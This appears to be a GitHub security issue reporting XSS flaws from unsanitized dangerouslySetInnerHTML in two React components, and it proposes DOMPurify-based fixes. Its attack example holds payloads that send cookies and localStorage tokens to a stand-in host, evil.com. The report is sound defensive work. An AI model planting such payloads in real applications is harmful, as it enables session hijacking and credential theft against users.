---
title: "🟠 HIGH: XSS Vulnerabilities in React Components"
labels: security, high, frontend
assignees: ''
---

## Severity: HIGH (CVSS 7.2)

### Locations
1. `resources/js/Pages/Order/Components/TestDetails.jsx` line 202
2. `resources/js/Pages/Order/Components/TestCard.jsx` line 170

### Issue
React components use `dangerouslySetInnerHTML` to render user-provided content without proper sanitization, allowing Cross-Site Scripting (XSS) attacks.

### Vulnerable Code
```javascript
<div dangerouslySetInnerHTML={{ __html: userContent }} />
```

### Impact
- Attackers can inject malicious JavaScript
- Session hijacking via cookie theft
- Unauthorized actions performed as the victim
- Phishing attacks within the application
- Data exfiltration

### Attack Example
```javascript
// Attacker inputs:
<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">

// Or:
<script>
  window.location='https://evil.com/steal?data='+localStorage.getItem('token');
</script>
```

### Fix Required

**Option 1: Use DOMPurify for sanitization**
```javascript
import DOMPurify from 'dompurify';

<div dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(userContent)
}} />
```

**Option 2: Avoid dangerouslySetInnerHTML entirely**
```javascript
// If content is just text, use regular rendering:
<div>{userContent}</div>

// If you need basic formatting, use a library like react-markdown:
<ReactMarkdown>{userContent}</ReactMarkdown>
```

### Installation
```bash
npm install dompurify
npm install @types/dompurify --save-dev
```

### Verification
1. Attempt to inject `<script>alert('XSS')</script>`
2. Verify the script doesn't execute
3. Check that legitimate HTML still renders correctly
4. Review all uses of `dangerouslySetInnerHTML` in the codebase

### Related Search
```bash
grep -r "dangerouslySetInnerHTML" resources/js
```

### References
- OWASP: Cross Site Scripting (XSS)
- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)
